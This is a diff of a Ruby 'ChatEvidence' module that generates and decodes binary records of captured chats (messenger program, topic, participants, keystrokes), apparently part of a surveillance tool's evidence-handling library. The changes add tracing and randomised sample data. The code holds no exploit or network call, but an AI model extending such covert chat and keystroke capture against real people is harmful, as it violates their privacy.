@@ -1,18 +1,20 @@
 # encoding: utf-8
 
+require 'rcs-common/trace'
 require 'rcs-common/evidence/common'
 
 module RCS
 
 module ChatEvidence
+  include RCS::Tracer
 
   ELEM_DELIMITER = 0xABADC0DE
   KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
   
   def content
-    program = "MSN".to_utf16le_binary_null
-    topic = "Chatting...".to_utf16le_binary_null
-    users = "ALoR, Daniel".to_utf16le_binary_null
+    program = ["MSN", "Skype", "Yahoo", "Paltalk", "Sticazzi"].sample.to_utf16le_binary_null
+    topic = ["Chatting...", "New projecs", "Fuffa", "Bubbole"].sample.to_utf16le_binary_null
+    users = ["ALoR, Daniel", "Bruno, Fulvio", "Naga, Quez", "Tizio, Caio"].sample.to_utf16le_binary_null
     content = StringIO.new
     t = Time.now.getutc
     content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
@@ -31,35 +33,40 @@ module ChatEvidence
     ret
   end
   
-  def decode_content
-    stream = StringIO.new @info[:chunks].join
+  def decode_content(common_info, chunks)
+    stream = StringIO.new chunks.join
 
-    evidences = Array.new
     until stream.eof?
       tm = stream.read 36
-      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
-      @info[:data][:program] = ''
-      @info[:data][:topic] = ''
-      @info[:data][:users] = ''
-      @info[:data][:content] = ''
+      trace :info, "CHAT Time.gm #{tm.unpack('l*')}"
+      info = Hash[common_info]
+      info[:acquired] = Time.gm(*(tm.unpack('l*')), 0)
+      info[:data] = Hash.new
+      info[:data][:program] = ''
+      info[:data][:topic] = ''
+      info[:data][:users] = ''
+      info[:data][:content] = ''
 
       program = stream.read_utf16le_string
-      @info[:data][:program] = program.utf16le_to_utf8 unless program.nil?
+      info[:data][:program] = program.utf16le_to_utf8 unless program.nil?
+      trace :info, "CHAT Program #{info[:data][:program]}"
       topic = stream.read_utf16le_string
-      @info[:data][:topic] = topic.utf16le_to_utf8 unless topic.nil?
+      info[:data][:topic] = topic.utf16le_to_utf8 unless topic.nil?
+      trace :info, "CHAT Topic #{info[:data][:topic]}"
       users = stream.read_utf16le_string
-      @info[:data][:users] = users.utf16le_to_utf8 unless users.nil?
+      info[:data][:users] = users.utf16le_to_utf8 unless users.nil?
+      trace :info, "CHAT Users #{info[:data][:users]}"
       keystrokes = stream.read_utf16le_string
-      @info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
+      info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
+      trace :info, "CHAT Content #{info[:data][:content]}"
 
       delim = stream.read(4).unpack("L*").first
       raise EvidenceDeserializeError.new("Malformed CHAT (missing delimiter)") unless delim == ELEM_DELIMITER
 
-      # this is not the real clone! redefined clone ...
-      evidences << self.clone
+      puts "decode_content #{info}"
+
+      yield info if block_given?
     end
-    
-    return evidences
   end
 end # ChatEvidence
 
